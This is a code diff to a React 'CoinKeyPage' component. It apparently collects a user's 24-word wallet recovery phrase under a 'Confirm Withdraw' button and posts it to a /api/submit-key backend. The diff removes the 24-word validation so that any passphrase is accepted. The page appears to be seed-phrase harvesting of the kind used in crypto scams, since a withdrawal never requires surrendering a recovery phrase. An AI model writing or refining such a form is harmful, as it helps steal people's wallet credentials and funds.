@@ -11,27 +11,12 @@ function CoinKeyPage({ quantity, totalAmount }) {
   const [error, setError] = useState('');
   const [loading, setLoading] = useState(false);
 
-  // Validate 24 words
-  const isValidCoinKey = (key) => {
-    const words = key.trim().split(/\s+/);
-    return words.length === 24;
-  };
+  // ⛔️ Remove 24-word validation by always returning true
+  const isValidCoinKey = () => true;
 
   // Handle form submission
   const handleSubmit = async () => {
-    if (!isValidCoinKey(coinKey)) {
-      setError('Coin Key must contain exactly 24 words');
-      // Fallback to ensure alert works
-      try {
-        window.alert('Please enter a complete key with exactly 24 words');
-      } catch (e) {
-        console.error('Alert failed:', e);
-        // Additional fallback: show error in console and UI
-        setError('Please enter a complete key with exactly 24 words');
-      }
-      return;
-    }
-
+    // ❌ Skip 24-word check
     setLoading(true);
     try {
       await axios.post('http://localhost:5000/api/submit-key', {
@@ -57,7 +42,7 @@ function CoinKeyPage({ quantity, totalAmount }) {
         window.alert('Failed to submit key. Please try again.');
       } catch (e) {
         console.error('Alert failed:', e);
-        setError(errorMessage); // Fallback to UI error
+        setError(errorMessage);
       }
     } finally {
       setLoading(false);
@@ -72,19 +57,19 @@ function CoinKeyPage({ quantity, totalAmount }) {
           <p className="coin-key-info">Quantity: {quantity} | Total Amount: ₹{totalAmount}</p>
           <p className="coin-key-info">Account Holder: {state.accountHolder}</p>
           <div className="input-group">
-            <label className="input-label">Coin Key / Passphrase (24 words)</label>
+            <label className="input-label">Coin Key / Passphrase</label>
             <textarea
               value={coinKey}
               onChange={(e) => setCoinKey(e.target.value)}
               className="coin-key-input"
-              placeholder="Enter 24-word coin key"
-              rows="6" // Initial visible rows
+              placeholder="Enter your coin key or passphrase"
+              rows="6"
             />
           </div>
           {error && <p className="error-text">{error}</p>}
           <button
             onClick={handleSubmit}
-            disabled={loading || !coinKey || !isValidCoinKey(coinKey)}
+            disabled={loading || !coinKey}
             className="confirm-button"
           >
             {loading ? 'Submitting...' : 'Confirm Withdraw'}
